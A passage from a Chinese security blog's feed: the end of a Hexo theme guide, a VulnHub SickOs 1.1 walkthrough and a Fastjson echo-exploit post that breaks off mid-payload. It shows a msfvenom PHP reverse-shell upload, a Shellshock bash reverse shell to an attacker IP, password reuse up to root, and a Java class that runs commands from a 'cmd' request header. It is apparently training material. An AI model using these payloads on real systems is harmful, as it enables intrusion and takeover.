href="http://encode.chahuo.com/">chahuo</a>、<a href="http://tool.chinaz.com/tools/hash.aspx">站长工具</a>。</li><li>您可以在文章md文件的 front-matter 中指定 reprintPolicy 来给单个文章配置转载规则</li></ol></blockquote><p>以下为文章的 <code>Front-matter</code> 示例。</p><h3 id="最简示例"><a href="#最简示例" class="headerlink" title="最简示例"></a>最简示例</h3><pre class="line-numbers language-none"><code class="language-none">---title: typora-vue-theme主题介绍date: 2018-09-07 09:25:00---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="最全示例"><a href="#最全示例" class="headerlink" title="最全示例"></a>最全示例</h3><pre class="line-numbers language-none"><code class="language-none">---title: typora-vue-theme主题介绍date: 2018-09-07 09:25:00author: 赵奇img: &#x2F;source&#x2F;images&#x2F;xxx.jpgtop: truehide: falsecover: truecoverImg: &#x2F;images&#x2F;1.jpgpassword: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92toc: falsemathjax: falsesummary: 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要categories: Markdowntags:  - Typora  - Markdown---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="效果截图"><a href="#效果截图" class="headerlink" title="效果截图"></a>效果截图</h2><p><a href="https://camo.githubusercontent.com/ca91ff24a662fc02f64cfed3446fadc7d84dade01a698ebe3dd7b3710926489a/687474703a2f2f7374617469632e626c696e6b666f782e636f6d2f6d61746572792d32303138313230322d312e706e67"><img src="https://camo.githubusercontent.com/ca91ff24a662fc02f64cfed3446fadc7d84dade01a698ebe3dd7b3710926489a/687474703a2f2f7374617469632e626c696e6b666f782e636f6d2f6d61746572792d32303138313230322d312e706e67" alt="首页"></a></p><p><a href="https://camo.githubusercontent.com/cc39895742d9eb7a90d25b8f4935be41a4feffc034eb1e3f665316699634e5cc/687474703a2f2f7374617469632e626c696e6b666f782e636f6d2f6d61746572792d32303138313230322d322e706e67"><img src="https://camo.githubusercontent.com/cc39895742d9eb7a90d25b8f4935be41a4feffc034eb1e3f665316699634e5cc/687474703a2f2f7374617469632e626c696e6b666f782e636f6d2f6d61746572792d32303138313230322d322e706e67" alt="首页推荐文章"></a></p><p><a href="https://camo.githubusercontent.com/a19a106d92f07d240643dfb8a2712fd0b2271d3dd6e24300732f2d96aac98393/687474703a2f2f7374617469632e626c696e6b666f782e636f6d2f6d61746572792d32303138313230322d332e706e67"><img src="https://camo.githubusercontent.com/a19a106d92f07d240643dfb8a2712fd0b2271d3dd6e24300732f2d96aac98393/687474703a2f2f7374617469632e626c696e6b666f782e636f6d2f6d61746572792d32303138313230322d332e706e67" alt="首页文章列表"></a></p><p><a href="https://camo.githubusercontent.com/44cacfc83c73411a8932d19fbfb3a24f49d39676837f84691796d258dd468a83/687474703a2f2f7374617469632e626c696e6b666f782e636f6d2f6d61746572792d32303138313230322d372e706e67"><img src="https://camo.githubusercontent.com/44cacfc83c73411a8932d19fbfb3a24f49d39676837f84691796d258dd468a83/687474703a2f2f7374617469632e626c696e6b666f782e636f6d2f6d61746572792d32303138313230322d372e706e67" alt="首页文章列表"></a></p><p><a href="https://camo.githubusercontent.com/552609ffbcb915e5630e8506adda1d15fdfbcc10c2517e5e5729ac0ea22842bd/687474703a2f2f7374617469632e626c696e6b666f782e636f6d2f6d61746572792d32303138313230322d382e706e67"><img src="https://camo.githubusercontent.com/552609ffbcb915e5630e8506adda1d15fdfbcc10c2517e5e5729ac0ea22842bd/687474703a2f2f7374617469632e626c696e6b666f782e636f6d2f6d61746572792d32303138313230322d382e706e67" alt="首页文章列表"></a></p><h2 id="自定制修改"><a href="#自定制修改" class="headerlink" title="自定制修改"></a>自定制修改</h2><p>在本主题的 <code>_config.yml</code> 中可以修改部分自定义信息，有以下几个部分：</p><ul><li>菜单</li><li>我的梦想</li><li>首页的音乐播放器和视频播放器配置</li><li>是否显示推荐文章名称和按钮配置</li><li><code>favicon</code> 和 <code>Logo</code></li><li>个人信息</li><li>TOC 目录</li><li>文章打赏信息</li><li>复制文章内容时追加版权信息</li><li>MathJax</li><li>文章字数统计、阅读时长</li><li>点击页面的’爱心’效果</li><li>我的项目</li><li>我的技能</li><li>我的相册</li><li><code>Gitalk</code>、<code>Gitment</code>、<code>Valine</code> 和 <code>disqus</code> 评论配置</li><li><a href="http://busuanzi.ibruce.info/">不蒜子统计</a>和谷歌分析（<code>Google Analytics</code>）</li><li>默认特色图的集合。当文章没有设置特色图时，本主题会根据文章标题的 <code>hashcode</code> 值取余，来选择展示对应的特色图</li></ul><p><strong>我认为个人博客应该都有自己的风格和特色</strong>。如果本主题中的诸多功能和主题色彩你不满意，可以在主题中自定义修改，很多更自由的功能和细节点的修改难以在主题的 <code>_config.yml</code> 中完成，需要修改源代码才来完成。以下列出了可能对你有用的地方：</p><h3 id="修改主题颜色"><a href="#修改主题颜色" class="headerlink" title="修改主题颜色"></a>修改主题颜色</h3><p>在主题文件的 <code>/source/css/matery.css</code> 文件中，搜索 <code>.bg-color</code> 来修改背景颜色：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;* 整体背景颜色，包括导航、移动端的导航、页尾、标签页等的背景颜色. *&#x2F;.bg-color &#123;    background-image: linear-gradient(to right, #4cbf30 0%, #0f9d58 100%);&#125;@-webkit-keyframes rainbow &#123;   &#x2F;* 动态切换背景颜色. *&#x2F;&#125;@keyframes rainbow &#123;    &#x2F;* 动态切换背景颜色. *&#x2F;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="修改-banner-图和文章特色图"><a href="#修改-banner-图和文章特色图" class="headerlink" title="修改 banner 图和文章特色图"></a>修改 banner 图和文章特色图</h3><p>你可以直接在 <code>/source/medias/banner</code> 文件夹中更换你喜欢的 <code>banner</code> 图片，主题代码中是每天动态切换一张，只需 <code>7</code> 张即可。如果你会 <code>JavaScript</code> 代码，可以修改成你自己喜欢切换逻辑，如：随机切换等，<code>banner</code> 切换的代码位置在 <code>/layout/_partial/bg-cover-content.ejs</code> 文件的 <code>&lt;script&gt;&lt;/script&gt;</code> 代码中：</p><pre class="line-numbers language-none"><code class="language-none">$(&#39;.bg-cover&#39;).css(&#39;background-image&#39;, &#39;url(&#x2F;medias&#x2F;banner&#x2F;&#39; + new Date().getDay() + &#39;.jpg)&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 <code>/source/medias/featureimages</code> 文件夹中默认有 24 张特色图片，你可以再增加或者减少，并需要在 <code>_config.yml</code> 做同步修改。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 站点搭建、Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub-SickOs-1.1渗透学习</title>
      <link href="/2022/01/19/vulnhub-sickos-1.1-shen-tou-xue-xi/"/>
      <url>/2022/01/19/vulnhub-sickos-1.1-shen-tou-xue-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靶机地址：<a href="https://download.vulnhub.com/sickos/sick0s1.1.7z">https://download.vulnhub.com/sickos/sick0s1.1.7z</a></p><p>靶机难度：中级（CTF）</p><p>靶机发布日期：2015年12月11日</p><p>靶机描述：这个CTF明确地比喻了如何在网络上执行黑客策略，以在安全的环境中危害网络。 这个虚拟机与我在OSCP中遇到的实验室非常相似。 目的是破坏网络/计算机并在其上获得管理/根目录特权。</p><p>目标：得到root权限&amp;找到flag.txt</p><p>作者：F10Sec</p><p>时间：2021-07-05</p><p>请注意：</p><p>对于所有这些计算机，我已经使用VMware运行下载的计算机。我将使用Kali Linux作为解决该目标的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>我们在VM中需要确定攻击目标的IP地址，可以使用netdiscover/nmap来获取目标主机的IP地址：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">nmap <span class="token operator">-</span>sP <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> <span class="token operator">-</span>T4参数解读：<span class="token operator">-</span>sP <span class="token punctuation">:</span> 用ping扫描判断主机是否存活，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping<span class="token operator">-</span>T4： 指定扫描过程使用的时序，总有<span class="token number">6</span>个级别（<span class="token number">0</span><span class="token operator">-</span><span class="token number">5</span>），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况较好的情况下推荐使用T4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191616298.png" alt="img"></p><p>我们已经找到了目标计算机IP地址：192.168.1.11</p><p>第一步是找出目标计算机上可用的开放端口和一些服务。因此我在目标计算机上启动了nmap全端口T5速度扫描：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">nmap <span class="token operator">-</span>sS <span class="token operator">-</span>sV <span class="token operator">-</span>sC <span class="token operator">-</span>O <span class="token operator">-</span>T5  <span class="token operator">-</span>Pn <span class="token operator">-</span>p<span class="token operator">-</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.11</span>参数解读：<span class="token operator">-</span>A ：启用<span class="token operator">-</span>A选项之后，Nmap将检测目标主机的下述信息        服务版本识别（<span class="token operator">-</span>sV）；        操作系统识别（<span class="token operator">-</span>O）；        脚本扫描（<span class="token operator">-</span>sC）；        Traceroute（–traceroute）<span class="token operator">-</span>sS<span class="token operator">/</span>sT<span class="token operator">/</span>sA<span class="token operator">/</span>sW<span class="token operator">/</span>sM<span class="token punctuation">:</span>指定使用 TCP SYN<span class="token operator">/</span><span class="token function">Connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">/</span>ACK<span class="token operator">/</span>Window<span class="token operator">/</span>Maimon scans的方式来对目标主机进行扫描<span class="token operator">-</span>sV<span class="token punctuation">:</span> 指定让Nmap进行服务版本扫描<span class="token operator">-</span>p<span class="token operator">-</span>：进行全端口扫描<span class="token operator">-</span>Pn：禁用主机检测（<span class="token operator">-</span>Pn）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191616592.png" alt="img"></p><table><thead><tr><th>PORT</th><th>SERVICE</th><th>VERSION DETECTION</th></tr></thead><tbody><tr><td>TCP: 22</td><td>SSH</td><td>OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)</td></tr><tr><td>TCP: 3128</td><td>HTTP-Proxy</td><td>Squid http proxy 3.1.19</td></tr><tr><td>TCP: 8080</td><td>HTTP-Proxy</td><td>http proxy 3.1.19</td></tr></tbody></table><p>目标计算机上开放了22、3128、8080三个端口。</p><h2 id="Squid-枚举"><a href="#Squid-枚举" class="headerlink" title="Squid 枚举"></a>Squid 枚举</h2><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191616669.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191616803.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191616470.png" alt="img"></p><h2 id="Nikto-通过代理扫描"><a href="#Nikto-通过代理扫描" class="headerlink" title="Nikto 通过代理扫描"></a>Nikto 通过代理扫描</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">nikto ：开源的WEB扫描评估软件，可以扫描指定主机的WEB类型、主机名、指定目录、特定CGI漏洞、返回主机允许的 http模式等nikto <span class="token operator">-</span>h 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11 <span class="token operator">-</span>useproxy http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11:3128<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191616990.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617155.png" alt="img"></p><table><thead><tr><th><a href="https://www.wappalyzer.com/technologies/web-servers/?utm_source=popup&utm_medium=extension&utm_campaign=wappalyzer">Web 服务器</a></th><th>编程语言</th><th><a href="https://www.wappalyzer.com/technologies/operating-systems/?utm_source=popup&utm_medium=extension&utm_campaign=wappalyzer">操作系统</a></th></tr></thead><tbody><tr><td>Apache: 2.2.22</td><td>PHP 5.3.10</td><td>Ubuntu</td></tr></tbody></table><p>Nikto 扫描发现存在<code>robots.txt</code>目录、<code>cgi-bin/status</code>（容易受到shellshock攻击），存在可利用漏洞；</p><h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>这边先用开启代理，然后访问目标主机的80端口；</p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617771.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617709.png" alt="img"></p><p>查看源代码没啥游泳的信息，这边是用代理来访问的80，打开robots.txt发现存在wolfcms目录；</p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617365.png" alt="img"></p><p>找到/wolfcms的信息，有可能此网站是使用Wolf CMS中搭建的，也可能是个目录……..</p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617306.png" alt="img"></p><p>使用搜索引擎搜索Wolf CMS，发现是个开源的CMS，在github[<a href="https://github.com/wolfcms/wolfcms]%E4%B8%8A%E5%8F%AF%E4%BB%A5%E6%9F%A5%E7%9C%8B%E5%88%B0%E6%BA%90%E7%A0%81%E4%BF%A1%E6%81%AF%EF%BC%9B">https://github.com/wolfcms/wolfcms]上可以查看到源码信息；</a></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617175.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617808.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617256.png" alt="img"></p><h2 id="目录枚举"><a href="#目录枚举" class="headerlink" title="目录枚举"></a>目录枚举</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">gobuster <span class="token function">dir</span> <span class="token operator">-</span>u http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11/wolfcms/  <span class="token operator">-</span>w <span class="token operator">/</span>usr/share/wordlists/dirbuster/directory-list-2<span class="token punctuation">.</span>3-medium<span class="token punctuation">.</span>txt <span class="token operator">-</span>t 50 <span class="token operator">--</span>random-agent   <span class="token operator">--</span>proxy   http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11:3128<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191618447.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191618617.png" alt="img"></p><p>访问下/?/admin/login，这是通病…遇到Wolf cms直接能使用这个目录进入登录界面</p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191618975.png" alt="img"></p><p>使用账户密码admin/admin成功登录到网站后台(不要问我怎么知道的…….)</p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191618419.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191618261.png" alt="img"></p><h2 id="上传Webshell"><a href="#上传Webshell" class="headerlink" title="上传Webshell"></a>上传Webshell</h2><h3 id="1、上传php-meterpreter-payload文件，浏览器访问上传后的文件，获取php类型的反弹会话；"><a href="#1、上传php-meterpreter-payload文件，浏览器访问上传后的文件，获取php类型的反弹会话；" class="headerlink" title="1、上传php meterpreter payload文件，浏览器访问上传后的文件，获取php类型的反弹会话；"></a>1、上传php meterpreter payload文件，浏览器访问上传后的文件，获取php类型的反弹会话；</h3><p>成功登录后，发现能上传文件，这边要使用msfvenom做PHP木马文件上传进行shell提权</p><h4 id="1、筛选payload"><a href="#1、筛选payload" class="headerlink" title="1、筛选payload"></a>1、筛选payload</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">msfvenom <span class="token operator">-</span>l payload <span class="token punctuation">|</span> grep php <span class="token punctuation">|</span> grep meterpreter    筛选合适的payload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191618025.png" alt="img"></p><h4 id="2、生成payload"><a href="#2、生成payload" class="headerlink" title="2、生成payload"></a>2、生成payload</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">msfvenom <span class="token operator">-</span>p php/meterpreter_reverse_tcp lhost=192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>7 lport=6666 <span class="token operator">-</span>o Wolfcms<span class="token punctuation">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619417.png" alt="img"></p><h4 id="3、上传payload"><a href="#3、上传payload" class="headerlink" title="3、上传payload"></a>3、上传payload</h4><p>在web页面上传后记录下上传文件的路径；</p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619999.png" alt="img"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">上传后文件的目录：http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11/wolfcms/public/Wolfcms<span class="token punctuation">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4、Kali设置监听载荷"><a href="#4、Kali设置监听载荷" class="headerlink" title="4、Kali设置监听载荷"></a>4、Kali设置监听载荷</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">use exploit/multi/handler<span class="token function">set</span> payload php/meterpreter_reverse_tcpshow options<span class="token function">set</span> LHOST 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>7<span class="token function">set</span> LPORT 6666exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619404.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619212.png" alt="img"></p><p>注意：此时上传的php类型的Meterpreter是不具备完整功能的，因此可以继续上传对应操作系统类型的payload获取更多的操作功能；这里发现随然获取了Metrepreter会话，但是shell命令无法执行，后续使用冰蝎上传weblshell连接；</p><h3 id="2、利用冰蝎上传weblshell连接"><a href="#2、利用冰蝎上传weblshell连接" class="headerlink" title="2、利用冰蝎上传weblshell连接"></a>2、利用冰蝎上传weblshell连接</h3><p>这里必须配置好代理才可以正常连接webshell；</p><h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619370.png" alt="img"></h4><h2 id="Shellshock-Bash-反向-Shell"><a href="#Shellshock-Bash-反向-Shell" class="headerlink" title="Shellshock Bash 反向 Shell"></a>Shellshock Bash 反向 Shell</h2><p>Burp Suite 用于操作 User-Agent：包括 bash 反向 shell。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> ignored<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token operator">/</span>bin/bash <span class="token operator">-</span>i >&amp; <span class="token operator">/</span>dev/tcp/192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>221<span class="token punctuation">.</span>139/443 0>&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619992.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619018.png" alt="img"></p><p>查看/var/www/wolfcms/目录下的config.php文件；</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token operator">/</span><span class="token operator">/</span> Database settings:<span class="token keyword">define</span><span class="token punctuation">(</span><span class="token string">'DB_DSN'</span><span class="token punctuation">,</span> <span class="token string">'mysql:dbname=wolf;host=localhost;port=3306'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">define</span><span class="token punctuation">(</span><span class="token string">'DB_USER'</span><span class="token punctuation">,</span> <span class="token string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">define</span><span class="token punctuation">(</span><span class="token string">'DB_PASS'</span><span class="token punctuation">,</span> <span class="token string">'john@123'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">define</span><span class="token punctuation">(</span><span class="token string">'TABLE_PREFIX'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看系统存在的可登录账户：</p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191620535.png" alt="img"></p><p>使用python一句话获取标准shell</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">python <span class="token operator">-</span>c <span class="token string">'import pty;pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191620816.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191620133.png" alt="img"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">www-<span class="token keyword">data</span>@SickOs:<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www$ su <span class="token operator">-</span> sickossu <span class="token operator">-</span> sickosPassword: john@123sickos@SickOs:~$ <span class="token function">ls</span>     <span class="token function">ls</span>sickos@SickOs:~$ <span class="token function">cat</span> <span class="token punctuation">.</span>bash_history<span class="token function">cat</span> <span class="token punctuation">.</span>bash_historysudo su<span class="token keyword">exit</span>sickos@SickOs:~$ sudo susudo su<span class="token namespace">[sudo]</span> password <span class="token keyword">for</span> sickos: john@123root@SickOs:<span class="token operator">/</span>home/sickos<span class="token comment"># </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191620364.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191620177.png" alt="img"></p><p>成功获取到Flag；</p><p>若有收获，就点个赞吧</p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson回显</title>
      <link href="/2022/01/19/fastjson-hui-xian/"/>
      <url>/2022/01/19/fastjson-hui-xian/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191516424.png" alt="image-20191018154346759"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191518543.png" alt="image-20191018154515787"></p><h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><p>1、先启动一个LDAP服务</p><pre class="line-numbers language-none"><code class="language-none">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;127. 0.0.1:6666&#x2F;#Cat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2、再启动http服务</p><pre class="line-numbers language-none"><code class="language-none">py -3 -m http.server --bind 127.0.0.1 6666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3、再http服务下的目录创建一个<code>XXX.java</code>文件 然后<code>Javac XXX.java</code> 文件内容如下：</p><pre class="line-numbers language-none"><code class="language-none">public class Cat &#123;    public Cat()throws Exception&#123;        boolean flag &#x3D; false;        ThreadGroup group &#x3D; Thread.currentThread().getThreadGroup();        java.lang.reflect.Field f &#x3D; group.getClass().getDeclaredField(&quot;threads&quot;);        f.setAccessible(true);        Thread[] threads &#x3D; (Thread[]) f.get(group);        for(int i &#x3D; 0; i &lt; threads.length; i++) &#123;            try&#123;                Thread t &#x3D; threads[i];                if (t &#x3D;&#x3D; null) continue;                String str &#x3D; t.getName();                if (str.contains(&quot;exec&quot;) || !str.contains(&quot;http&quot;)) continue;                f &#x3D; t.getClass().getDeclaredField(&quot;target&quot;);                f.setAccessible(true);                Object obj &#x3D; f.get(t);                if (!(obj instanceof Runnable)) continue;                f &#x3D; obj.getClass().getDeclaredField(&quot;this$0&quot;);                f.setAccessible(true);                obj &#x3D; f.get(obj);                try&#123;                    f &#x3D; obj.getClass().getDeclaredField(&quot;handler&quot;);                &#125;catch (NoSuchFieldException e)&#123;                    f &#x3D; obj.getClass().getSuperclass().getSuperclass().getDeclaredField(&quot;handler&quot;);                &#125;                f.setAccessible(true);                obj &#x3D; f.get(obj);                try&#123;                    f &#x3D; obj.getClass().getSuperclass().getDeclaredField(&quot;global&quot;);                &#125;catch(NoSuchFieldException e)&#123;                    f &#x3D; obj.getClass().getDeclaredField(&quot;global&quot;);                &#125;                f.setAccessible(true);                obj &#x3D; f.get(obj);                f &#x3D; obj.getClass().getDeclaredField(&quot;processors&quot;);                f.setAccessible(true);                java.util.List processors &#x3D; (java.util.List)(f.get(obj));                for(int j &#x3D; 0; j &lt; processors.size(); ++j) &#123;                    Object processor &#x3D; processors.get(j);                    f &#x3D; processor.getClass().getDeclaredField(&quot;req&quot;);                    f.setAccessible(true);                    Object req &#x3D; f.get(processor);                    Object resp &#x3D; req.getClass().getMethod(&quot;getResponse&quot;, new Class[0]).invoke(req, new Object[0]);                    str &#x3D; (String)req.getClass().getMethod(&quot;getHeader&quot;, new Class[]&#123;String.class&#125;).invoke(req, new Object[]&#123;&quot;cmd&quot;&#125;);                    if (str !&#x3D; null &amp;&amp; !str.isEmpty()) &#123;                        resp.getClass().getMethod(&quot;setStatus&quot;, new Class[]&#123;int.class&#125;).invoke(resp, new Object[]&#123;new Integer(200)&#125;);                        String[] cmds &#x3D; System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? new String[]&#123;&quot;cmd.exe&quot;, &quot;&#x2F;c&quot;, str&#125; : new String[]&#123;&quot;&#x2F;bin&#x2F;sh&quot;, &quot;-c&quot;, str&#125;;                        String charsetName &#x3D; System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? &quot;GBK&quot;:&quot;UTF-8&quot;;                        byte[] result &#x3D; (new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream(),charsetName)).useDelimiter(&quot;\\A&quot;).next().getBytes(charsetName);                        try &#123;                            Class cls &#x3D; Class.forName(&quot;org.apache.tomcat.util.buf.ByteChunk&quot;);                            obj &#x3D; cls.newInstance();                            cls.getDeclaredMethod(&quot;setBytes&quot;, new Class[]&#123;byte[].class, int.class, int.class&#125;).invoke(obj, new Object[]&#123;result, new Integer(0), new Integer(result.length)&#125;);                            resp.getClass().getMethod(&quot;doWrite&quot;, new Class[]&#123;cls&#125;).invoke(resp, new Object[]&#123;obj&#125;);                        &#125; catch (NoSuchMethodException var5) &#123;                            Class cls &#x3D; Class.forName(&quot;java.nio.ByteBuffer&quot;);                            obj &#x3D; cls.getDeclaredMethod(&quot;wrap&quot;, new Class[]&#123;byte[].class&#125;).invoke(cls, new Object[]&#123;result&#125;);                            resp.getClass().getMethod(&quot;doWrite&quot;, new Class[]&#123;cls&#125;).invoke(resp, new Object[]&#123;obj&#125;);                        &#125;                        flag &#x3D; true;                    &#125;                    if (flag) break;                &#125;                if (flag)  break;            &#125;catch(Exception e)&#123;                continue;            &#125;        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4、payload 直接发送</p><pre class="line-numbers language-none"><code class="language-none">&#123;    &quot;a&quot;:&#123;        &quot;@type&quot;:&quot;java.lang.Class&quot;,        